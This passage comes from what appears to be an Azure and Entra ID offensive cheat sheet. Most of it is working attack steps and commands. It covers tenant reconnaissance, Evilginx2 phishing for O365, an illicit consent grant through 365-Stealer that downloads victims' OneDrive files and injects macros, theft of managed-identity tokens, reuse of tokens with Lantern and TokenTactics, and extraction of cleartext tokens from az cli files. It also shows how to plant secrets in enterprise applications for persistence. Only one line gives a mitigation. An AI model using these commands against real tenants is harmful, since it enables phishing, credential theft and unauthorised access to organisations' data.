class=&#34;language-powershell&#34;&gt;https://login.microsoftonline.com/getuserrealm.srf?login=&amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt;&amp;amp;xml=1&#xA;https://login.microsoftonline.com/getuserrealm.srf?login=root@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com&amp;amp;xml=1&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Get the Tenant ID &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;https://login.microsoftonline.com/&amp;lt;DOMAIN&amp;gt;/.well-known/openid-configuration&#xA;https://login.microsoftonline.com/&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com/.well-known/openid-configuration&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Enumeration methodology&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Check Azure Joined &#xA;PS&amp;gt; dsregcmd.exe /status&#xA;+----------------------------------------------------------------------+&#xA;| Device State |&#xA;+----------------------------------------------------------------------+&#xA; AzureAdJoined : YES&#xA; EnterpriseJoined : NO&#xA; DomainJoined : NO&#xA; Device Name : jumpvm&#xA;&#xA;# Enumerate resources&#xA;PS Az&amp;gt; Get-AzResource&#xA;&#xA;# Enumerate role assignments&#xA;PS Az&amp;gt; Get-AzRoleAssignment -Scope /subscriptions/&amp;lt;SUBSCRIPTION-ID&amp;gt;/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/&amp;lt;VM-NAME&amp;gt;`&#xA;&#xA;# Get info on a role&#xA;PS Az&amp;gt; Get-AzRoleDefinition -Name &#34;Virtual Machine Command Executor&#34;&#xA;&#xA;# Get info user&#xA;PS AzureAD&amp;gt; Get-AzureADUser -ObjectId &amp;lt;ID&amp;gt;&#xA;PS AzureAD&amp;gt; Get-AzureADUser -ObjectId test@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com | fl * &#xA;&#xA;# List all groups&#xA;PS AzureAD&amp;gt; Get-AzureADGroup -All $true&#xA;&#xA;# Get members of a group&#xA;PS Az&amp;gt; Get-AzADGroup -DisplayName &#39;&amp;lt;GROUP-NAME&amp;gt;&#39;&#xA;PS Az&amp;gt; Get-AzADGroupMember -GroupDisplayName &#39;&amp;lt;GROUP-NAME&amp;gt;&#39; | select UserPrincipalName&#xA;&#xA;# Get Azure AD information&#xA;PS&amp;gt; Import-Module C:\Tools\AADInternals\AADInternals.psd1&#xA;PS AADInternals&amp;gt; Get-AADIntLoginInformation -UserName admin@&amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com&#xA;PS AADInternals&amp;gt; Get-AADIntTenantID -Domain &amp;lt;TENANT NAME&amp;gt;.onmicrosoft.com # Get Tenant ID&#xA;PS AADInternals&amp;gt; Invoke-AADIntReconAsOutsider -DomainName &amp;lt;DOMAIN&amp;gt; # Get all the information&#xA;&#xA;# Check if there is a user logged-in to az cli&#xA;PS&amp;gt; az ad signed-in-user show&#xA;&#xA;# Check AppID Alternative Names/Display Name &#xA;PS AzureAD&amp;gt; Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq &#34;&amp;lt;APP-ID&amp;gt;&#34;} | fl&#xA;&#xA;&#xA;# Get all application objects registered using the current tenant&#xA;PS AzureAD&amp;gt; Get-AzureADApplication -All $true&#xA;&#xA;# Get all details about an application&#xA;PS AzureAD&amp;gt; Get-AzureADApplication -ObjectId &amp;lt;ID&amp;gt; | fl *&#xA;&#xA;# List all VM&#39;s the user has access to&#xA;PS Az&amp;gt; Get-AzVM &#xA;PS Az&amp;gt; Get-AzVM | fl&#xA;&#xA;# Get all function apps&#xA;PS Az&amp;gt; Get-AzFunctionApp&#xA;&#xA;# Get all webapps&#xA;PS Az&amp;gt; Get-AzWebApp&#xA;PS Az&amp;gt; Get-AzWebApp | select-object Name, Type, Hostnames&#xA;&#xA;# List all storage accounts&#xA;PS Az&amp;gt; Get-AzStorageAccount&#xA;PS Az&amp;gt; Get-AzStorageAccount | fl&#xA;&#xA;# List all keyvaults&#xA;PS Az&amp;gt; Get-AzKeyVault&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Phishing with Evilginx2&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS C:\Tools&amp;gt; evilginx2 -p C:\Tools\evilginx2\phishlets&#xA;: config domain username.corp&#xA;: config ip 10.10.10.10&#xA;: phishlets hostname o365 login.username.corp&#xA;: phishlets get-hosts o365&#xA;&#xA;Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine&#xA;&#xA;# copy certificate and enable the phishing&#xA;PS C:\Tools&amp;gt; Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt&#xA;PS C:\Tools&amp;gt; Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key&#xA;: phishlets enable o365&#xA;&#xA;# get the phishing URL&#xA;: lures create o365&#xA;: lures get-url 0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Illicit Consent Grant&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Check if users are allowed to consent to apps: &lt;code&gt;PS AzureADPreview&amp;gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole&lt;/code&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Disable user consent&lt;/strong&gt; : Users cannot grant permissions to applications.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Users can consent to apps from verified publishers or your organization, but only for permissions you select&lt;/strong&gt; : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Users can consent to all apps&lt;/strong&gt; : allows all users to consent to any permission which doesn&#39;t require admin consent,&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Custom app consent policy&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Register Application&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Login to &lt;a href=&#34;https://portal.azure.com&#34;&gt;https://portal.azure.com&lt;/a&gt; &amp;gt; Azure Active Directory&lt;/li&gt; &#xA; &lt;li&gt;Click on &lt;strong&gt;App registrations&lt;/strong&gt; &amp;gt; &lt;strong&gt;New registration&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Enter the Name for our application&lt;/li&gt; &#xA; &lt;li&gt;Under support account types select &lt;strong&gt;&#34;Accounts in any organizational directory (Any Azure AD directory - Multitenant)&#34;&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is &lt;code&gt;https://&amp;lt;DOMAIN/IP&amp;gt;:&amp;lt;PORT&amp;gt;/login/authorized&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Click &lt;strong&gt;Register&lt;/strong&gt; and save the &lt;strong&gt;Application ID&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Configure Application&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Click on &lt;code&gt;Certificates &amp;amp; secrets&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Click on &lt;code&gt;New client secret&lt;/code&gt; then enter the &lt;strong&gt;Description&lt;/strong&gt; and click on &lt;strong&gt;Add&lt;/strong&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Save the &lt;strong&gt;secret&lt;/strong&gt;&#39;s value.&lt;/li&gt; &#xA; &lt;li&gt;Click on API permissions &amp;gt; Add a permission&lt;/li&gt; &#xA; &lt;li&gt;Click on Microsoft Graph &amp;gt; &lt;strong&gt;Delegated permissions&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Search and select the below mentioned permissions and click on Add permission &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Contacts.Read&lt;/li&gt; &#xA;   &lt;li&gt;Mail.Read / Mail.ReadWrite&lt;/li&gt; &#xA;   &lt;li&gt;Mail.Send&lt;/li&gt; &#xA;   &lt;li&gt;Notes.Read.All&lt;/li&gt; &#xA;   &lt;li&gt;Mailboxsettings.ReadWrite&lt;/li&gt; &#xA;   &lt;li&gt;Files.ReadWrite.All&lt;/li&gt; &#xA;   &lt;li&gt;User.ReadBasic.All&lt;/li&gt; &#xA;   &lt;li&gt;User.Read&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Setup 365-Stealer&lt;/h3&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; Default port for 365-Stealer phishing is 443&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Run XAMPP and start Apache&lt;/li&gt; &#xA; &lt;li&gt;Clone 365-Stealer into &lt;code&gt;C:\xampp\htdocs\&lt;/code&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;git clone https://github.com/AlteredSecurity/365-Stealer.git&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Install the requirements &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Python3&lt;/li&gt; &#xA;   &lt;li&gt;PHP CLI or Xampp server&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;pip install -r requirements.txt&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Enable sqlite3 (Xampp &amp;gt; Apache config &amp;gt; php.ini) and restart Apache&lt;/li&gt; &#xA; &lt;li&gt;Edit &lt;code&gt;C:/xampp/htdocs/yourvictims/index.php&lt;/code&gt; if needed &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Disable IP whitelisting &lt;code&gt;$enableIpWhiteList = false;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Go to 365-Stealer Management portal &amp;gt; Configuration (&lt;a href=&#34;http://localhost:82/365-stealer/yourVictims&#34;&gt;http://localhost:82/365-stealer/yourVictims&lt;/a&gt;) &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Client Id&lt;/strong&gt; (Mandatory): This will be the Application(Client) Id of the application that we registered.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Client Secret&lt;/strong&gt; (Mandatory): Secret value from the Certificates &amp;amp; secrets tab that we created.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Redirect URL&lt;/strong&gt; (Mandatory): Specify the redirect URL that we entered during registering the App like &lt;code&gt;https://&amp;lt;Domain/IP&amp;gt;/login/authorized&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Macros Location&lt;/strong&gt;: Path of macro file that we want to inject.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Extension in OneDrive&lt;/strong&gt;: We can provide file extensions that we want to download from the victims account or provide &lt;code&gt;*&lt;/code&gt; to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;strong&gt;Delay&lt;/strong&gt;: Delay the request by specifying time in seconds while stealing&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Create a Self Signed Certificate to use HTTPS&lt;/li&gt; &#xA; &lt;li&gt;Run the application either click on the button or run this command : &lt;code&gt;python 365-Stealer.py --run-app&lt;/code&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;--no-ssl&lt;/code&gt;: disable HTTPS&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;--port&lt;/code&gt;: change the default listening port&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;--token&lt;/code&gt;: provide a specific token&lt;/li&gt; &#xA;   &lt;li&gt;&lt;code&gt;--refresh-token XXX --client-id YYY --client-secret ZZZ&lt;/code&gt;: use a refresh token&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Find the Phishing URL: go to &lt;code&gt;https://&amp;lt;IP/Domain&amp;gt;:&amp;lt;Port&amp;gt;&lt;/code&gt; and click on &lt;strong&gt;Read More&lt;/strong&gt; button or in the console.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;: Enable &lt;code&gt;Do not allow user consent&lt;/code&gt; for applications in the &#34;Consent and permissions menu&#34;.&lt;/p&gt; &#xA;&lt;h2&gt;Token from Managed Identity&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;MSI_ENDPOINT&lt;/strong&gt; is an alias for &lt;strong&gt;IDENTITY_ENDPOINT&lt;/strong&gt;, and &lt;strong&gt;MSI_SECRET&lt;/strong&gt; is an alias for &lt;strong&gt;IDENTITY_HEADER&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : &lt;code&gt;env&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Most of the time, you want a token for one of these resources:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://storage.azure.com&#34;&gt;https://storage.azure.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://vault.azure.net&#34;&gt;https://vault.azure.net&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://graph.microsoft.com&#34;&gt;https://graph.microsoft.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://management.azure.com&#34;&gt;https://management.azure.com&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Azure API via Powershell&lt;/h3&gt; &#xA;&lt;p&gt;Get &lt;strong&gt;access_token&lt;/strong&gt; from &lt;strong&gt;IDENTITY_HEADER&lt;/strong&gt; and &lt;strong&gt;IDENTITY_ENDPOINT&lt;/strong&gt;: &lt;code&gt;system(&#39;curl &#34;$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;amp;api-version=2017-09-01&#34; -H secret:$IDENTITY_HEADER&#39;);&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Then query the Azure REST API to get the &lt;strong&gt;subscription ID&lt;/strong&gt; and more .&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;$Token = &#39;eyJ0eX..&#39;&#xA;$URI = &#39;https://management.azure.com/subscriptions?api-version=2020-01-01&#39;&#xA;# $URI = &#39;https://graph.microsoft.com/v1.0/applications&#39;&#xA;$RequestParams = @{&#xA; Method = &#39;GET&#39;&#xA; Uri = $URI&#xA; Headers = @{&#xA; &#39;Authorization&#39; = &#34;Bearer $Token&#34;&#xA; }&#xA;}&#xA;(Invoke-RestMethod @RequestParams).value &#xA;&#xA;# List resources and check for runCommand privileges&#xA;$URI = &#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01&#39;&#xA;$URI = &#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/&amp;lt;RG-NAME&amp;gt;/providers/Microsoft.Compute/virtualMachines/&amp;lt;RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Azure API via Python Version&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;IDENTITY_ENDPOINT = os.environ[&#39;IDENTITY_ENDPOINT&#39;]&#xA;IDENTITY_HEADER = os.environ[&#39;IDENTITY_HEADER&#39;]&#xA;&#xA;print(&#34;[+] Management API&#34;)&#xA;cmd = &#39;curl &#34;%s?resource=https://management.azure.com/&amp;amp;api-version=2017-09-01&#34; -H secret:%s&#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER)&#xA;val = os.popen(cmd).read()&#xA;print(&#34;Access Token: &#34;+json.loads(val)[&#34;access_token&#34;])&#xA;print(&#34;ClientID/AccountID: &#34;+json.loads(val)[&#34;client_id&#34;])&#xA;&#xA;print(&#34;\r\n[+] Graph API&#34;)&#xA;cmd = &#39;curl &#34;%s?resource=https://graph.microsoft.com/&amp;amp;api-version=2017-09-01&#34; -H secret:%s&#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER)&#xA;val = os.popen(cmd).read()&#xA;print(json.loads(val)[&#34;access_token&#34;])&#xA;print(&#34;ClientID/AccountID: &#34;+json.loads(val)[&#34;client_id&#34;])&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or inside a Python Function:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import logging, os&#xA;import azure.functions as func&#xA;&#xA;def main(req: func.HttpRequest) -&amp;gt; func.HttpResponse:&#xA;    logging.info(&#39;Python HTTP trigger function processed a request.&#39;)&#xA;    IDENTITY_ENDPOINT = os.environ[&#39;IDENTITY_ENDPOINT&#39;]&#xA;    IDENTITY_HEADER = os.environ[&#39;IDENTITY_HEADER&#39;]&#xA;    cmd = &#39;curl &#34;%s?resource=https://management.azure.com&amp;amp;apiversion=2017-09-01&#34; -H secret:%s&#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER)&#xA;    val = os.popen(cmd).read()&#xA;    return func.HttpResponse(val, status_code=200)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Get Tokens&lt;/h3&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; The lifetime of a Primary Refresh Token is 14 days!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# az cli - get tokens &#xA;az account get-access-token &#xA;az account get-access-token --resource-type aad-graph&#xA;# or Az&#xA;(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token&#xA;# or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Use Tokens&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Tokens contain all the claims including that for MFA and Conditional Access&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Az Powershell &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS C:\Tools&amp;gt; $token = &#39;eyJ0e..&#39;&#xA;PS C:\Tools&amp;gt; Connect-AzAccount -AccessToken $token -AccountId &amp;lt;ACCOUNT-ID&amp;gt;&#xA;&#xA;# Access Token and Graph Token&#xA;PS C:\Tools&amp;gt; $token = &#39;eyJ0eX..&#39;&#xA;PS C:\Tools&amp;gt; $graphaccesstoken = &#39;eyJ0eX..&#39;&#xA;PS C:\Tools&amp;gt; Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId &amp;lt;ACCOUNT-ID&amp;gt;&#xA;PS C:\Tools&amp;gt; Get-AzResource&#xA;# ERROR: &#39;this.Client.SubscriptionId&#39; cannot be null.&#xA;# ---&amp;gt; The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;AzureAD &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-Module C:\Tools\AzureAD\AzureAD.psd1&#xA;$AADToken = &#39;eyJ0…&#39;&#xA;Connect-AzureAD -AadAccessToken $AADToken -TenantId &amp;lt;TENANT-ID&amp;gt; -AccountId &amp;lt;ACCOUNT-ID&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Refresh Tokens&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ConstantinT/Lantern&#34;&gt;https://github.com/ConstantinT/Lantern&lt;/a&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Lantern.exe cookie --derivedkey &amp;lt;Key from Mimikatz&amp;gt; --context &amp;lt;Context from Mimikatz&amp;gt; --prt &amp;lt;PRT from Mimikatz&amp;gt;&#xA;Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename &amp;lt;Name&amp;gt; --outpfxfile &amp;lt;Some path&amp;gt;&#xA;Lantern.exe token --username &amp;lt;Username&amp;gt; --password &amp;lt;Password&amp;gt;&#xA;Lantern.exe token --refreshtoken &amp;lt;RefreshToken&amp;gt;&#xA;Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) &#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rvrsh3ll/TokenTactics&#34;&gt;https://github.com/rvrsh3ll/TokenTactics&lt;/a&gt; &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-Module .\TokenTactics.psd1&#xA;CommandType     Name                                               Version    Source&#xA;-----------     ----                                               -------    ------&#xA;Function        Clear-Token                                        0.0.1      TokenTactics&#xA;Function        Dump-OWAMailboxViaMSGraphApi                       0.0.1      TokenTactics&#xA;Function        Forge-UserAgent                                    0.0.1      TokenTactics&#xA;Function        Get-AzureToken                                     0.0.1      TokenTactics&#xA;Function        Get-TenantID                                       0.0.1      TokenTactics&#xA;Function        Open-OWAMailboxInBrowser                           0.0.1      TokenTactics&#xA;Function        Parse-JWTtoken                                     0.0.1      TokenTactics&#xA;Function        RefreshTo-AzureCoreManagementToken                 0.0.1      TokenTactics&#xA;Function        RefreshTo-AzureManagementToken                     0.0.1      TokenTactics&#xA;Function        RefreshTo-DODMSGraphToken                          0.0.1      TokenTactics&#xA;Function        RefreshTo-GraphToken                               0.0.1      TokenTactics&#xA;Function        RefreshTo-MAMToken                                 0.0.1      TokenTactics&#xA;Function        RefreshTo-MSGraphToken                             0.0.1      TokenTactics&#xA;Function        RefreshTo-MSManageToken                            0.0.1      TokenTactics&#xA;Function        RefreshTo-MSTeamsToken                             0.0.1      TokenTactics&#xA;Function        RefreshTo-O365SuiteUXToken                         0.0.1      TokenTactics&#xA;Function        RefreshTo-OfficeAppsToken                          0.0.1      TokenTactics&#xA;Function        RefreshTo-OfficeManagementToken                    0.0.1      TokenTactics&#xA;Function        RefreshTo-OutlookToken                             0.0.1      TokenTactics&#xA;Function        RefreshTo-SubstrateToken                           0.0.1      TokenTactics&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Stealing Tokens&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Get-AzurePasswords &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;Import-Module Microburst.psm1&#xA;Get-AzurePasswords&#xA;Get-AzurePasswords -Verbose | Out-GridView&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Stealing tokens from az cli&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;az cli stores access tokens in clear text in &lt;strong&gt;accessTokens.json&lt;/strong&gt; in the directory &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\.Azure&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;azureProfile.json in the same directory contains information about subscriptions.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Stealing tokens from az powershell&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Az PowerShell stores access tokens in clear text in &lt;strong&gt;TokenCache.dat&lt;/strong&gt; in the directory &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\.Azure&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;It also stores &lt;strong&gt;ServicePrincipalSecret&lt;/strong&gt; in clear-text in &lt;strong&gt;AzureRmContext.json&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Users can save tokens using &lt;code&gt;Save-AzContext&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Add credentials to all Enterprise Applications&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Add secrets&#xA;PS &amp;gt; . C:\Tools\Add-AzADAppSecret.ps1&#xA;PS &amp;gt; Add-AzADAppSecret -GraphToken $graphtoken -Verbose&#xA;&#xA;# Use secrets to authenticate as Service Principal&#xA;PS &amp;gt; $password = ConvertTo-SecureString &#39;&amp;lt;SECRET/PASSWORD&amp;gt;&#39; -AsPlainText -Force&#xA;PS &amp;gt; $creds = New-Object System.Management.Automation.PSCredential(&#39;&amp;lt;AppID&amp;gt;&#39;, $password)&#xA;PS &amp;gt; Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant &#39;&amp;lt;TenantID&amp;gt;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Spawn SSH for Azure Web App&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;az webapp create-remote-connection --subscription &amp;lt;SUBSCRIPTION-ID&amp;gt; --resource-group &amp;lt;RG-NAME&amp;gt; -n &amp;lt;APP-SERVICE-NAME&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Azure Storage Blob&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Blobs - &lt;code&gt;*.blob.core.windows.net&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;File Services - &lt;code&gt;*.file.core.windows.net&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Data Tables - &lt;code&gt;*.table.core.windows.net&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Queues - &lt;code&gt;*.queue.core.windows.net&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Enumerate blobs&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS &amp;gt; . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureBlobs.ps1&#xA;PS &amp;gt; Invoke-EnumerateAzureBlobs -Base &amp;lt;SHORT DOMAIN&amp;gt; -OutputFile azureblobs.txt&#xA;Found Storage Account -  testsecure.blob.core.windows.net&#xA;Found Storage Account -  securetest.blob.core.windows.net&#xA;Found Storage Account -  securedata.blob.core.windows.net&#xA;Found Storage Account -  securefiles.blob.core.windows.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;SAS URL&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Use &lt;a href=&#34;https://azure.microsoft.com/en-us/features/storage-explorer/&#34;&gt;Storage Explorer&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Click on &lt;strong&gt;Open Connect Dialog&lt;/strong&gt; in the left menu.&lt;/li&gt; &#xA; &lt;li&gt;Select &lt;strong&gt;Blob container&lt;/strong&gt;.&lt;/li&gt; &#xA; &lt;li&gt;On the &lt;strong&gt;Select Authentication Method&lt;/strong&gt; page &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Select &lt;strong&gt;Shared access signature (SAS)&lt;/strong&gt; and click on Next&lt;/li&gt; &#xA;   &lt;li&gt;Copy the URL in &lt;strong&gt;Blob container SAS URL&lt;/strong&gt; field.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; You can also use &lt;code&gt;subscription&lt;/code&gt;(username/password) to access storage resources such as blobs and files.&lt;/p&gt; &#xA;&lt;h3&gt;List and download blobs&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS Az&amp;gt; Get-AzResource&#xA;PS Az&amp;gt; Get-AzStorageAccount -name &amp;lt;NAME&amp;gt; -ResourceGroupName &amp;lt;NAME&amp;gt;&#xA;PS Az&amp;gt; Get-AzStorageContainer -Context (Get-AzStorageAccount -name &amp;lt;NAME&amp;gt; -ResourceGroupName &amp;lt;NAME&amp;gt;).context&#xA;PS Az&amp;gt; Get-AzStorageBlobContent -Container &amp;lt;NAME&amp;gt; -Context (Get-AzStorageAccount -name &amp;lt;NAME&amp;gt; -ResourceGroupName &amp;lt;NAME&amp;gt;).context -Blob&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Runbook Automation&lt;/h2&gt; &#xA;&lt;h3&gt;Create a Runbook&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;# Check user right for automation&#xA;az extension add --upgrade -n automation&#xA;az automation account list # if it doesn&#39;t return anything the user is not a part of an Automation 